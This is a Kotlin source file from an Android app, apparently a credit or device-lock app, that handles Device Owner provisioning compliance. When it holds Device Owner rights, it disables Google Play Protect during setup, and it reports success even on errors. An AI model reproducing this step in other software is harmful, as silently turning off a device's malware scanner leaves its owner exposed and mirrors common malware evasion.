package com.cdccreditsmart.app.presentation.admin

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.util.Log
import com.cdccreditsmart.app.compliance.PlayProtectManager

/**
 * Activity required for Android 12+ Device Owner provisioning.
 * Handles ADMIN_POLICY_COMPLIANCE intent from Android setup wizard.
 * 
 * CRITICAL for Infinix/Transsion devices:
 * - Must respond IMMEDIATELY (no blocking operations)
 * - Must disable Play Protect as early as possible
 * - Heavy operations deferred to background
 * 
 * Flow:
 * 1. System calls GET_PROVISIONING_MODE (ProvisioningModeActivity)
 * 2. System sets Device Owner
 * 3. System calls ADMIN_POLICY_COMPLIANCE (this activity)
 * 4. We confirm compliance and disable Play Protect
 * 5. System calls PROVISIONING_SUCCESSFUL (ProvisioningSuccessActivity)
 */
class AdminPolicyComplianceActivity : Activity() {

    companion object {
        private const val TAG = "AdminPolicyCompliance"
        
        private val TRANSSION_MANUFACTURERS = listOf(
            "INFINIX", "TECNO", "ITEL", "TRANSSION"
        )
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        val startTime = System.currentTimeMillis()
        
        Log.i(TAG, "")
        Log.i(TAG, "========================================")
        Log.i(TAG, "ADMIN_POLICY_COMPLIANCE - Android ${Build.VERSION.SDK_INT}")
        Log.i(TAG, "Device: ${Build.MANUFACTURER} ${Build.MODEL}")
        Log.i(TAG, "Intent: ${intent?.action}")
        Log.i(TAG, "========================================")
        
        if (intent?.action != "android.app.action.ADMIN_POLICY_COMPLIANCE") {
            Log.w(TAG, "Unexpected intent action: ${intent?.action}")
            setResult(RESULT_CANCELED)
            finish()
            return
        }

        try {
            val isTranssion = isTranssionDevice()
            if (isTranssion) {
                Log.i(TAG, "Transsion device detected - optimized compliance check")
            }
            
            val isDeviceOwner = checkDeviceOwnerStatus()
            Log.i(TAG, "Device Owner status: $isDeviceOwner")
            
            if (isDeviceOwner) {
                disablePlayProtectQuickly()
            }
            
            val result = Intent()
            
            val elapsedMs = System.currentTimeMillis() - startTime
            Log.i(TAG, "Policy compliance confirmed")
            Log.i(TAG, "Processing time: ${elapsedMs}ms")
            Log.i(TAG, "========================================")
            
            setResult(RESULT_OK, result)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error confirming compliance: ${e.message}")
            val result = Intent()
            setResult(RESULT_OK, result)
        } finally {
            finish()
        }
    }
    
    private fun isTranssionDevice(): Boolean {
        val manufacturer = Build.MANUFACTURER?.uppercase() ?: ""
        return TRANSSION_MANUFACTURERS.any { manufacturer.contains(it) }
    }
    
    private fun checkDeviceOwnerStatus(): Boolean {
        return try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            dpm.isDeviceOwnerApp(packageName)
        } catch (e: Exception) {
            Log.w(TAG, "Could not check Device Owner status: ${e.message}")
            false
        }
    }
    
    private fun disablePlayProtectQuickly() {
        try {
            Log.i(TAG, "Disabling Play Protect during compliance check...")
            val playProtectManager = PlayProtectManager(this)
            playProtectManager.disablePlayProtect()
        } catch (e: Exception) {
            Log.w(TAG, "Could not disable Play Protect: ${e.message}")
        }
    }
}